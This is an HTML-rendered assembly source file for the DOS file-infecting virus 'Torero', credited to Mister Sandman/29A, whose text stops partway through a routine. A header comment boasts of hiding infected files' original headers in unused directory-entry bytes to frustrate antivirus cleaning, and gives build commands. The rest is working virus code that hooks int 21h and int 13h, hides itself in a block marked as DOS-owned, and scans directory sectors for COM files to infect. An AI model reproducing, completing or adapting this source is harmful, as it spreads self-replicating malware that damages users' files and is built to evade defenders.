<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Torero.1427 - torero.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                             млллллм млллллм млллллм</span><span class="sc0">
</span><span class="sc1">;          Torero                             ллл ллл ллл ллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;          by Mister Sandman/29A               мммллп плллллл ллллллл</span><span class="sc0">
</span><span class="sc1">;                                             лллмммм ммммллл ллл ллл</span><span class="sc0">
</span><span class="sc1">;                                             ллллллл ллллллп ллл ллл</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Hoho... here you have a new coolio viral technique, especially dedicated</span><span class="sc0">
</span><span class="sc1">; to those who think that everything on  viruses  was invented yet :) This</span><span class="sc0">
</span><span class="sc1">; virus ain't a 'powerful' one; in fact, and  as i decided  to do  in this</span><span class="sc0">
</span><span class="sc1">; first issue as i hadn't many  time, it's a simple  infector just written</span><span class="sc0">
</span><span class="sc1">; to show this new viral capability, never used before as far as i know.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; And what is this technique about?, you might ask. Ok... apart from DirII</span><span class="sc0">
</span><span class="sc1">; and all its family, we don't  know many viruses that  store the original</span><span class="sc0">
</span><span class="sc1">; header of infected files in other place than the viral code, right?</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; AVV and i were making some researches and suddenly found ten free unused</span><span class="sc0">
</span><span class="sc1">; bytes on the directory entry of each file... and this the place where my</span><span class="sc0">
</span><span class="sc1">; virus stores the  header of every file it infects :) In this way, the AV</span><span class="sc0">
</span><span class="sc1">; companies  must write some specific  routines for disinfecting Torero...</span><span class="sc0">
</span><span class="sc1">; this  means that the cleaning  of our virus is  more difficult, which is</span><span class="sc0">
</span><span class="sc1">; what we're looking for :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Anyway, as every viral technique, it has  some pros and some cons... and</span><span class="sc0">
</span><span class="sc1">; the cons consist on the next simple thingy: if someone copies, compress-</span><span class="sc0">
</span><span class="sc1">; es, or manipulates an infected file, it  will have a different directory</span><span class="sc0">
</span><span class="sc1">; entry, and  then  it will  be imposible to restore its  original header.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; However, and as this is just a sample virus, i didn't pay much attention</span><span class="sc0">
</span><span class="sc1">; to this kinda probabilities, and i just used an idea Wintermute gave me:</span><span class="sc0">
</span><span class="sc1">; if the host doesn't find  its original header, it will display a message</span><span class="sc0">
</span><span class="sc1">; i'm sure you all know: 'This program requires Microsoft Windows.' :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; As a last (but not least) feature  in this virus, don't forget to have a</span><span class="sc0">
</span><span class="sc1">; look at the infection  mark, based on using the eigth attribute bit, al-</span><span class="sc0">
</span><span class="sc1">; ways empty and unused until now. This is a specially good infection mark</span><span class="sc0">
</span><span class="sc1">; for a virus, as it's very simple and doesn't  get flagged because of in-</span><span class="sc0">
</span><span class="sc1">; correct  time  stamp and all  that shit. Besides, it makes things easier</span><span class="sc0">
</span><span class="sc1">; for us when implementing stealth techniques, etc.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; About  the  name, i decided  to call it 'Torero' because it's  a spanish</span><span class="sc0">
</span><span class="sc1">; word which means 'bullfighter', often  used  for telling someone that he</span><span class="sc0">
</span><span class="sc1">; or what he did is cool, because toreros are supposed to have the biggest</span><span class="sc0">
</span><span class="sc1">; nuts around :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Compiling instructions</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; tasm /m torero.asm</span><span class="sc0">
</span><span class="sc1">; tlink torero.obj</span><span class="sc0">
</span><span class="sc1">; exe2bin torero.exe torero.com</span><span class="sc0">


                </span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">torero</span><span class="sc0">          </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">torero</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">torero</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">torero_start</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">torero_size</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">torero_end</span><span class="sc4">-</span><span class="sc5">torero_start</span><span class="sc0">

</span><span class="sc5">torero_entry</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">delta_offset</span><span class="sc0">                </span><span class="sc1">; Get ы-offset in BP</span><span class="sc0">
</span><span class="sc5">delta_offset</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                          </span><span class="sc1">; for l8r use</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_offset</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                      </span><span class="sc1">; Get DOS version</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc12">';)'</span><span class="sc0">                     </span><span class="sc1">; Are we already</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">set_int_21h</span><span class="sc0">                 </span><span class="sc1">; memory resident?</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                          </span><span class="sc1">; Save CS for the host</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; Don't lose DS</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Jump to the memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; copy and restore</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; the host header</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">check_host</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">set_int_21h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Program's MCB segment</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Y'</span><span class="sc0">        </span><span class="sc1">; Is it a Z block?</span><span class="sc0">
                </span><span class="sc6">jna</span><span class="sc0">     </span><span class="sc5">set_int_21h</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">torero_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],((</span><span class="sc5">torero_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">        </span><span class="sc1">; Mark block as Z</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">        </span><span class="sc1">; System memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],((</span><span class="sc5">torero_size</span><span class="sc4">/</span><span class="sc2">10h</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc2">4f44h</span><span class="sc0">    </span><span class="sc1">; Mark block as owned</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc2">0053h</span><span class="sc0">  </span><span class="sc1">; by DOS (444f53h,0)</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">torero_size</span><span class="sc0">              </span><span class="sc1">; Copy virus to memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">copy_vector</span><span class="sc0">          </span><span class="sc1">; Jump to the virus</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                                </span><span class="sc1">; copy in memory</span><span class="sc0">

</span><span class="sc5">copy_vector</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; Save int 21h's</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; original vector</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">old_int_21h</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int_21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Set ours</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                    </span><span class="sc1">; Save int 13h's</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">old_int_13h</span><span class="sc0">              </span><span class="sc1">; original vector</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int_13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Set ours</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">check_host</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_host</span><span class="sc0">                   </span><span class="sc1">; Open the host</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_sft</span><span class="sc0">                     </span><span class="sc1">; Get its SFT for our</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_mark</span><span class="sc0">                  </span><span class="sc1">; infection mark</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">messed_up</span><span class="sc0">                   </span><span class="sc1">; File is messed up :-(</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_entry</span><span class="sc0">                  </span><span class="sc1">; Read the entry</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">point_entry</span><span class="sc0">                 </span><span class="sc1">; Point to the header</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; Is it empty?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">restore_header</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Empty too? huh :-(</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">messed_up</span><span class="sc0">                   </span><span class="sc1">; File is messed up</span><span class="sc0">

</span><span class="sc5">restore_header</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; ES=host segment</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; Store it in the stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">                     </span><span class="sc1">; file header from the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">; Store the IP</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                               </span><span class="sc1">; DS:SI points to the</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">; original header, in</span><span class="sc0">
                                                    </span><span class="sc1">; the directory entry</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; DS=ES</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                                </span><span class="sc1">; Jump to the host</span><span class="sc0">

</span><span class="sc5">messed_up</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">                      </span><span class="sc1">; File is messed up...</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; close it and show</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">emergency</span><span class="sc0">                   </span><span class="sc1">; the Windows message :)</span><span class="sc0">

</span><span class="sc1">; ФФД Torero's int 13h handler УФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">

</span><span class="sc5">new_int_13h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">sector_write</span><span class="sc0">                </span><span class="sc1">; Sector write?</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0eah</span><span class="sc0">                        </span><span class="sc1">; Jump back to the</span><span class="sc0">
</span><span class="sc5">old_int_13h</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">                         </span><span class="sc1">; original int 13h</span><span class="sc0">

</span><span class="sc5">sector_write</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                       </span><span class="sc1">; Calculate how many</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">; files we must test</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                       </span><span class="sc1">; by multiplying the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; sector number with</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                       </span><span class="sc1">; 10h (entries)</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">bucle_end</span><span class="sc0">

</span><span class="sc5">int_13h_bucle</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc12">'O'</span><span class="sc0">      </span><span class="sc1">; -O-?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">more_files</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; -OM?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">more_files</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">                      </span><span class="sc1">; Then it's a COM</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">subtract</span><span class="sc0">

</span><span class="sc5">more_files</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                      </span><span class="sc1">; Look for more files</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">int_13h_bucle</span><span class="sc0">               </span><span class="sc1">; Look'n'loop :)</span><span class="sc0">

</span><span class="sc5">bucle_end</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; End of the bucle</span><span class="sc0">
                                                    </span><span class="sc1">; Call the original</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int_13h</span><span class="sc0">                     </span><span class="sc1">; int 13h and jump</span><span class="sc0">
</span><span class="sc5">xor_and_jump</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; to the original int</span><span class="sc0">

</span><span class="sc5">return_to_int</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Return to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">                       </span><span class="sc1">; original int 13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">subtract</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0e5h</span><span class="sc0">       </span><span class="sc1">; A deleted file...</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">more_files</span><span class="sc0">                  </span><span class="sc1">; bah, skip it</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0bh</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">    </span><span class="sc1">; Infected?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">more_files</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Is the header field</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">more_files</span><span class="sc0">                  </span><span class="sc1">; empty?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">more_files</span><span class="sc0">

